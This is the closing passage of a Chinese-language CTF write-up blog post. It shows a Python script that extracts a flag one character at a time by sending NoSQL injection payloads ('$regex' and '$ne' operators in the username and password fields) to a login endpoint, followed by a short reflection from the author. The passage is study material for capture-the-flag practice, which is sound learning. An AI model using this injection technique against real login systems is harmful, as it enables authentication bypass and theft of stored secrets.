</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=n>table</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>temp_target</span> <span class=o>=</span> <span class=n>target</span><span class=o>+</span><span class=n>j</span>
</span></span><span class=line><span class=cl>        <span class=n>payload1</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;^[^admin]</span><span class=si>{</span><span class=n>temp_target</span><span class=si>}</span><span class=s1>.*$&#39;</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload1 = f&#39;f{temp_target}.*$&#39;</span>
</span></span><span class=line><span class=cl>        <span class=n>data1</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;username[$regex]&#39;</span><span class=p>:</span><span class=n>payload1</span>
</span></span><span class=line><span class=cl>                <span class=p>,</span><span class=s1>&#39;password[$ne]&#39;</span><span class=p>:</span><span class=mi>1</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>payload2</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;^</span><span class=si>{</span><span class=n>temp_target</span><span class=si>}</span><span class=s1>.*$&#39;</span>
</span></span><span class=line><span class=cl>        <span class=n>data2</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;username[$regex]&#39;</span><span class=p>:</span><span class=s1>&#39;^[^admin]ql_flag&#39;</span>
</span></span><span class=line><span class=cl>                 <span class=p>,</span><span class=s1>&#39;password[$regex]&#39;</span><span class=p>:</span><span class=n>payload2</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># print(payload1)</span>
</span></span><span class=line><span class=cl>        <span class=c1># print(payload2)</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data2</span><span class=p>)</span><span class=o>.</span><span class=n>text</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=sa>r</span><span class=s2>&#34;\u767b\u9646\u6210\u529f&#34;</span> <span class=ow>in</span> <span class=n>r</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>target</span> <span class=o>+=</span> <span class=n>j</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>target</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=小结>小结</h2><p>起初是因为疑难解答群最近挺多师傅问这些题目，但是回头发现自己也不是特别熟悉，就拿三天时间慢慢的做了做，发现还是挺有意思的，之前不甚懂的，现在基本随便看看就知道，就当复习了一下</p></section><footer class=article-footer><section class=article-tags><a href=/tags/%E5%A7%BF%E5%8A%BF/>姿势</a>
<a href=/tags/mysql/>Mysql</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><footer class=site-footer><section class=copyright>&copy;
2024 -
2026 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.32.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> and adapted by <a href=https://github.com/baozongwi target=_blank rel=noopener>baozongwi</a><br>Total words across posts: 430.7k<br></section></footer></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.5aa3eabb86128d5119136440a67650fd512b617c9557f2a5948a74012c5f2943.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><button id=back-to-top class=back-to-top aria-label=回到顶部 title=回到顶部>↑</button></body></html>